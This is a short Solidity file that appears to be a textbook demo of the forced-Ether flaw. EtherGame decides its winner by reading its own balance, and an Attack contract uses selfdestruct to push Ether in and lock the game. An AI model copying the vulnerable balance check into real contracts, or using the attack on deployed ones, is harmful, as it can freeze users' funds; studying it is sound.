contract EtherGame {
    uint public targetAmount = 5 ether;
    address public winner;

    function play() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");
//uint balance+= msg.value;
        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {

        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
   }
